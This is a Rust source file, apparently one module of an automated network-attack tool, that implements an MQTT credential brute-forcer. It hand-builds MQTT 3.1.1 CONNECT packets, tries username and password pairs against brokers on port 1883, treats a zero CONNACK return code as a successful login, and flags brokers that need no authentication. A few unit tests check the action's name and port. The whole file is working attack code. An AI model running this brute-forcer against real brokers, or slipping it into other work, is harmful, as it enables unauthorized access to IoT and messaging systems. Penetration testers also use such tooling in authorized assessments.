use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use super::{BruteForceAction, Connector};

/// MQTT broker brute force — raw TCP CONNECT packet.
/// Tests username/password combinations against MQTT brokers.
/// Also detects open (no-auth) brokers.
pub struct MqttConnector;

impl Connector for MqttConnector {
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>> {
        let ip = ip.to_string();
        let user = user.to_string();
        let password = password.to_string();
        Box::pin(async move { mqtt_try_connect(&ip, port, &user, &password).await })
    }
}

/// Build an MQTT CONNECT packet.
fn build_mqtt_connect(client_id: &str, username: &str, password: &str) -> Vec<u8> {
    let mut payload = Vec::new();

    // Variable header
    let protocol_name = b"\x00\x04MQTT";
    let protocol_level: u8 = 4; // MQTT 3.1.1
    let mut connect_flags: u8 = 0x02; // Clean session

    if !username.is_empty() {
        connect_flags |= 0x80; // Username flag
        if !password.is_empty() {
            connect_flags |= 0x40; // Password flag
        }
    }

    let keep_alive: [u8; 2] = [0x00, 0x3C]; // 60 seconds

    let mut var_header = Vec::new();
    var_header.extend_from_slice(protocol_name);
    var_header.push(protocol_level);
    var_header.push(connect_flags);
    var_header.extend_from_slice(&keep_alive);

    // Payload: client ID
    let client_id_bytes = client_id.as_bytes();
    var_header.push((client_id_bytes.len() >> 8) as u8);
    var_header.push(client_id_bytes.len() as u8);
    var_header.extend_from_slice(client_id_bytes);

    // Payload: username
    if !username.is_empty() {
        let user_bytes = username.as_bytes();
        var_header.push((user_bytes.len() >> 8) as u8);
        var_header.push(user_bytes.len() as u8);
        var_header.extend_from_slice(user_bytes);

        // Payload: password
        if !password.is_empty() {
            let pass_bytes = password.as_bytes();
            var_header.push((pass_bytes.len() >> 8) as u8);
            var_header.push(pass_bytes.len() as u8);
            var_header.extend_from_slice(pass_bytes);
        }
    }

    // Fixed header: CONNECT (0x10) + remaining length
    let remaining_len = var_header.len();
    payload.push(0x10);
    // Encode remaining length (simple for packets < 128 bytes)
    if remaining_len < 128 {
        payload.push(remaining_len as u8);
    } else {
        payload.push((remaining_len % 128) as u8 | 0x80);
        payload.push((remaining_len / 128) as u8);
    }
    payload.extend_from_slice(&var_header);

    payload
}

async fn mqtt_try_connect(ip: &str, port: u16, user: &str, password: &str) -> bool {
    let addr = format!("{ip}:{port}");
    let result = tokio::time::timeout(Duration::from_secs(5), async {
        let mut stream = TcpStream::connect(&addr).await.ok()?;

        let packet = build_mqtt_connect("bjorn", user, password);
        stream.write_all(&packet).await.ok()?;

        // Read CONNACK response
        let mut buf = [0u8; 4];
        stream.read_exact(&mut buf).await.ok()?;

        // CONNACK: 0x20, length, session_present, return_code
        // return_code 0 = Connection Accepted
        if buf[0] == 0x20 && buf[3] == 0x00 {
            Some(())
        } else {
            None
        }
    })
    .await;

    matches!(result, Ok(Some(())))
}

pub fn create_action() -> BruteForceAction<MqttConnector> {
    BruteForceAction::new(MqttConnector, "MQTTBruteforce", "mqtt", 1883, None, 20)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::actions::Action;

    #[test]
    fn test_create_action_name() {
        assert_eq!(create_action().name(), "MQTTBruteforce");
    }

    #[test]
    fn test_create_action_port() {
        assert_eq!(create_action().port(), Some(1883));
    }

    #[test]
    fn test_create_action_parent() {
        assert_eq!(create_action().parent(), None);
    }
}
